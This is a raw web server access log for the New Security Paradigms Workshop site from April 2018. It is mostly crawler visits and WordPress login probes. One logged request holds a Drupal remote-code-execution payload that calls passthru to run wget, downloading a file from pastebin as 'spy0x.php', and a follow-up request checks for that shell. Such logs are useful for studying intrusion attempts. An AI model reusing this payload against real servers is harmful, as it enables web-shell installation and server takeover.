5.255.250.67 - - [25/Apr/2018:11:56:54 -0400] "GET /2017/cfp HTTP/1.1" 200 9018 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.216.19.59 - - [25/Apr/2018:11:57:15 -0400] "GET /2003/nspw-footer.html HTTP/1.1" 200 4149 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:57:38 -0400] "GET /2003/nspw-header.html HTTP/1.1" 200 3888 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:57:59 -0400] "GET /2004/index.content HTTP/1.1" 200 4998 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:58:21 -0400] "GET /2004/local.content HTTP/1.1" 200 3987 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
181.114.102.172 - - [25/Apr/2018:11:58:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
181.114.102.172 - - [25/Apr/2018:11:58:26 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:11:58:43 -0400] "GET /2004/nspw-footer.html HTTP/1.1" 200 4189 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
216.244.66.236 - - [25/Apr/2018:11:58:44 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
95.216.19.59 - - [25/Apr/2018:11:59:05 -0400] "GET /2004/nspw-header.html HTTP/1.1" 200 3871 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:11:59:27 -0400] "GET /2004/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:11:59:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:11:59:48 -0400] "GET /2004/panel.html HTTP/1.1" 200 4188 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:12:00:09 -0400] "GET /2008/nspw2008-cfpTwk.html HTTP/1.1" 200 7589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.239.65.9 - - [25/Apr/2018:12:00:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.239.65.9 - - [25/Apr/2018:12:00:55 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.107 - - [25/Apr/2018:12:01:14 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 284118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.236 - - [25/Apr/2018:12:01:18 -0400] "GET /papers/2010/paper%2024.pdf HTTP/1.1" 404 7894 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
117.192.210.52 - - [25/Apr/2018:12:01:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.71.104.105 - - [25/Apr/2018:12:02:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
90.71.104.105 - - [25/Apr/2018:12:02:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.255.250.67 - - [25/Apr/2018:12:03:52 -0400] "GET /papers/2010/?C=S;O=A HTTP/1.1" 403 3968 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.216.19.59 - - [25/Apr/2018:12:04:02 -0400] "GET /robots.txt HTTP/1.1" 200 5950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:04:23 -0400] "GET /2004/past.content HTTP/1.1" 200 5209 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:12:04:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:12:04:45 -0400] "GET /2004/proceedings.content HTTP/1.1" 200 3762 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
5.255.250.67 - - [25/Apr/2018:12:05:00 -0400] "GET /2002/?C=M;O=A HTTP/1.1" 200 5186 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [25/Apr/2018:12:05:05 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 200 5298 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:12:05:07 -0400] "GET /2004/submission.content HTTP/1.1" 200 3855 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
54.210.24.16 - - [25/Apr/2018:12:05:24 -0400] "GET /2018 HTTP/1.1" 200 6947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
95.216.19.59 - - [25/Apr/2018:12:05:29 -0400] "GET /2005/index.content HTTP/1.1" 200 4950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
169.1.189.226 - - [25/Apr/2018:12:05:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:05:51 -0400] "GET /2005/local.content HTTP/1.1" 200 3907 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:06:12 -0400] "GET /2005/nspw-footer.html HTTP/1.1" 200 4152 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.102.6.199 - - [25/Apr/2018:12:06:23 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 740529 "-" "Mozilla/5.0 (compatible; Google AppsViewer; http://drive.google.com)"
95.216.19.59 - - [25/Apr/2018:12:06:34 -0400] "GET /2005/nspw-header.html HTTP/1.1" 200 3866 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:06:56 -0400] "GET /2005/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
2.51.187.68 - - [25/Apr/2018:12:07:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
2.51.187.68 - - [25/Apr/2018:12:07:12 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:07:18 -0400] "GET /2005/panel.html HTTP/1.1" 200 4181 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:07:40 -0400] "GET /2005/past.content HTTP/1.1" 200 5302 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
179.198.129.63 - - [25/Apr/2018:12:07:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.198.129.63 - - [25/Apr/2018:12:07:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
200.204.161.74 - - [25/Apr/2018:12:07:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
200.204.161.74 - - [25/Apr/2018:12:07:58 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:08:02 -0400] "GET /2006/index.content HTTP/1.1" 200 4834 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:08:24 -0400] "GET /2006/invite/ HTTP/1.1" 200 4576 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:08:46 -0400] "GET /2006/invite/local.html HTTP/1.1" 200 4133 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:09:08 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 200 5242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:09:30 -0400] "GET /2006/invite/reg.html HTTP/1.1" 200 6728 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:12:09:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:12:09:52 -0400] "GET /2006/local.content HTTP/1.1" 200 3723 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [25/Apr/2018:12:10:00 -0400] "GET /2008/cfp.content HTTP/1.1" 200 13559 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
196.171.70.13 - - [25/Apr/2018:12:10:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:10:14 -0400] "GET /2006/nspw-footer.html HTTP/1.1" 200 4152 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
196.171.70.13 - - [25/Apr/2018:12:10:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:10:35 -0400] "GET /2006/nspw-header.html HTTP/1.1" 200 3852 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:10:57 -0400] "GET /2006/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:11:19 -0400] "GET /2006/panel.html HTTP/1.1" 200 4179 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:11:41 -0400] "GET /2006/panel.htmlQQ HTTP/1.1" 200 4770 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:12:02 -0400] "GET /2006/past.content HTTP/1.1" 200 5302 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:12:24 -0400] "GET /2006/pc.content HTTP/1.1" 200 7125 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:12:46 -0400] "GET /2006/pc.contentQQ HTTP/1.1" 200 4671 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:13:08 -0400] "GET /2007/cfp.content HTTP/1.1" 200 11975 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:13:29 -0400] "GET /2007/invite-old/ HTTP/1.1" 200 4576 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:13:51 -0400] "GET /2007/invite-old/local.html HTTP/1.1" 200 4133 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:14:13 -0400] "GET /2007/invite-old/preproc.html HTTP/1.1" 200 5242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
158.69.101.124 - - [25/Apr/2018:12:14:32 -0400] "GET /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fpastebin.com%2Fraw%2FtBqLLGbw+-O+spy0x.php HTTP/1.1" 200 6160 "-" "python-requests/2.18.4"
95.216.19.59 - - [25/Apr/2018:12:14:35 -0400] "GET /2007/invite-old/reg.html HTTP/1.1" 200 6728 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
139.47.3.227 - - [25/Apr/2018:12:14:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
139.47.3.227 - - [25/Apr/2018:12:14:37 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:12:14:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
158.69.101.124 - - [25/Apr/2018:12:14:44 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-K5TdIgh_lqjnfn_meVGbVQPnheMSHElMOXVmnxcGIyg HTTP/1.1" 200 4338 "-" "python-requests/2.18.4"
158.69.101.124 - - [25/Apr/2018:12:14:54 -0400] "GET /spy0x.php HTTP/1.1" 404 7971 "-" "Python-urllib/2.7"
66.249.73.87 - - [25/Apr/2018:12:14:56 -0400] "GET /robots.txt HTTP/1.1" 200 4504 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [25/Apr/2018:12:14:56 -0400] "GET /2004/cfp.shtml HTTP/1.1" 200 6340 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:12:14:57 -0400] "GET /2007/invite/reg.html HTTP/1.1" 200 6801 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [25/Apr/2018:12:15:06 -0400] "GET /nspw-small.jpg HTTP/1.1" 200 6780 "-" "Googlebot-Image/1.0"
95.216.19.59 - - [25/Apr/2018:12:15:19 -0400] "GET /2007/local.content HTTP/1.1" 200 6155 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
186.94.40.40 - - [25/Apr/2018:12:15:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.94.40.40 - - [25/Apr/2018:12:15:23 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:15:41 -0400] "GET /2007/nspw-footer.html HTTP/1.1" 200 4203 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:16:03 -0400] "GET /2007/nspw-header.html HTTP/1.1" 200 3879 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [25/Apr/2018:12:16:06 -0400] "GET /current/papers.shtml HTTP/1.1" 404 8014 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:12:16:25 -0400] "GET /2007/oc.content HTTP/1.1" 200 5533 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:16:47 -0400] "GET /2007/oldindex.html HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:17:08 -0400] "GET /2007/panel.htmlQQ HTTP/1.1" 200 4770 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:17:30 -0400] "GET /2007/past.content HTTP/1.1" 200 5454 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:17:52 -0400] "GET /2007/pc.content HTTP/1.1" 200 7939 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
41.42.126.157 - - [25/Apr/2018:12:17:57 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.42.126.157 - - [25/Apr/2018:12:17:59 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:18:14 -0400] "GET /2007/pc.content.2006 HTTP/1.1" 200 7125 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:18:35 -0400] "GET /2007/pc.contentQQ HTTP/1.1" 200 4671 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
123.125.71.30 - - [25/Apr/2018:12:18:37 -0400] "GET / HTTP/1.1" 200 11573 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
111.206.221.16 - - [25/Apr/2018:12:18:51 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 4360 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.221.36 - - [25/Apr/2018:12:18:51 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 4179 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.96 - - [25/Apr/2018:12:18:51 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 3853 "http://www.nspw.org/themes/garland/style.css?p7kfx6" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
95.216.19.59 - - [25/Apr/2018:12:18:57 -0400] "GET /2007/registration.content HTTP/1.1" 200 12230 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:19:19 -0400] "GET /2007/submission.content HTTP/1.1" 200 4614 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:12:19:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:12:19:41 -0400] "GET /2008/broken_past.content HTTP/1.1" 200 5581 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:12:19:52 -0400] "GET /2005/pc-gen.pl HTTP/1.1" 200 4849 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
223.181.198.154 - - [25/Apr/2018:12:19:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
223.181.198.154 - - [25/Apr/2018:12:19:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:20:03 -0400] "GET /2008/cfp.content HTTP/1.1" 200 13503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:20:25 -0400] "GET /2008/cfp.content.2007 HTTP/1.1" 200 11975 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
2.86.139.25 - - [25/Apr/2018:12:20:32 -0400] "GET /papers/1998/nspw1998-chang.pdf HTTP/1.1" 200 679141 "https://www.google.gr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
2.86.139.25 - - [25/Apr/2018:12:20:32 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/1998/nspw1998-chang.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
183.83.66.3 - - [25/Apr/2018:12:20:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
183.83.66.3 - - [25/Apr/2018:12:20:36 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:20:47 -0400] "GET /2008/invite-old/ HTTP/1.1" 200 4576 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:21:09 -0400] "GET /2008/invite-old/local.html HTTP/1.1" 200 4133 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:21:30 -0400] "GET /2008/invite-old/preproc.html HTTP/1.1" 200 5242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:21:52 -0400] "GET /2008/invite-old/reg.html HTTP/1.1" 200 6728 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
157.55.39.17 - - [25/Apr/2018:12:22:07 -0400] "GET /2016 HTTP/1.1" 200 7441 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
95.216.19.59 - - [25/Apr/2018:12:22:14 -0400] "GET /2008/invite/reg.html HTTP/1.1" 200 6801 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:22:36 -0400] "GET /2008/local.content HTTP/1.1" 200 6026 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:22:58 -0400] "GET /2008/local.content.2007 HTTP/1.1" 200 6155 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:23:20 -0400] "GET /2008/local.content.2008 HTTP/1.1" 200 6047 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
207.46.13.239 - - [25/Apr/2018:12:23:21 -0400] "GET /2017/cfp HTTP/1.1" 200 9464 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
95.216.19.59 - - [25/Apr/2018:12:23:42 -0400] "GET /2008/nspw-footer-old.html HTTP/1.1" 200 4203 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
64.62.252.169 - - [25/Apr/2018:12:23:57 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
95.216.19.59 - - [25/Apr/2018:12:24:04 -0400] "GET /2008/nspw-footer.html HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:24:25 -0400] "GET /2008/nspw-header.html HTTP/1.1" 200 3888 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [25/Apr/2018:12:24:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.216.19.59 - - [25/Apr/2018:12:24:47 -0400] "GET /2008/nspw2008-cfp.html HTTP/1.1" 200 7534 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [25/Apr/2018:12:24:48 -0400] "GET /papers/1997/?C=M;O=A HTTP/1.1" 403 3939 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
93.87.220.197 - - [25/Apr/2018:12:24:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.87.220.197 - - [25/Apr/2018:12:25:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.216.19.59 - - [25/Apr/2018:12:25:09 -0400] "GET /2008/nspw2008-cfpTwk.html HTTP/1.1" 200 7533 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:25:31 -0400] "GET /2008/oc.content.2007 HTTP/1.1" 200 5533 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [25/Apr/2018:12:25:36 -0400] "GET /2000 HTTP/1.1" 301 3998 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [25/Apr/2018:12:25:36 -0400] "GET /2000/ HTTP/1.1" 200 2001 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.216.19.59 - - [25/Apr/2018:12:25:53 -0400] "GET /2008/oc.content.2008 HTTP/1.1" 200 5549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:26:15 -0400] "GET /2008/panel.htmlQQ HTTP/1.1" 200 4770 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
216.244.66.200 - - [25/Apr/2018:12:26:25 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
95.216.19.59 - - [25/Apr/2018:12:26:36 -0400] "GET /2008/past.content HTTP/1.1" 200 5218 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
95.216.19.59 - - [25/Apr/2018:12:26:58 -0400] "GET /2008/pc.content HTTP/1.1" 200 7896 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
